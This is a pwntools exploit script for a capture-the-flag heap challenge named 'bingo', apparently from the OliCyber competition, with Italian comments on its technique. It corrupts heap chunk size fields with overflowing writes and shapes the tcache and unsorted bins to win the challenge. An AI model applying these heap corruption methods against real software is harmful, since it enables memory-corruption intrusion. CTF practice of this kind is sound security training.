from pwn import * 

elf = context.binary = ELF('./bingo')
context.terminal = ()

if args.REMOTE:
    p = remote('bin-go.challs.olicyber.it', 18000)
elif args.GDB:
    p = gdb.debug(elf.path, gdbscript='''
        b challenge
        c
        b alloc_new_chunk
        b free
        b check
        c
    ''')
else:
    p = elf.process()

def alloc(size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',str(size).encode())
    p.sendafter(b'> ',data)

def free():
    p.sendlineafter(b'> ',b'2')
try:
    size_chunk = 0x68
    for i in range(0,3):
        alloc(size_chunk,b'b'*size_chunk + p64(0x141)) 
        alloc(size_chunk,b'b'*size_chunk + p64(0x141)) 
        free()
        free()
        size_chunk += 0x10
    
    alloc(0x98,b'f'*0x98 + p64(0x141))
    alloc(0x98,b'f'*0x98 + b'\x31') # Qui 31 invece che 141 solo perche mi serve liberare la tcache a0 che uso dopo
                                    # se metto 141 dopo va un chunk in piu negli unsorted bin e non riesco a liberare quello che mi serve
    free()
    free()
    # Scrive sotto gli altri chunk allocati, cosi che posso usare la sua size come next size dell'altro chunk
    alloc(0x88,b'undr'*(0x68//4)) # chunk 0
    free()
    alloc(0xa8,b'chunkfinale') # chunk 0
    alloc(0xa8,b'e'*0xa8 + p64(0x141)) # chunk 1
    free()
    free()
    print("Prendo da unsorted bin")
    alloc(0x98,b'aura'*(0x98//4))# chunk 1
    alloc(0x98,p64(0xdeadbeefdeadbeef) * (0x98//8)) # chunk 2
    p.sendlineafter(b'> ',b'3')
    p.interactive()

except Exception as e:
    print("Error:", e)
    p.interactive()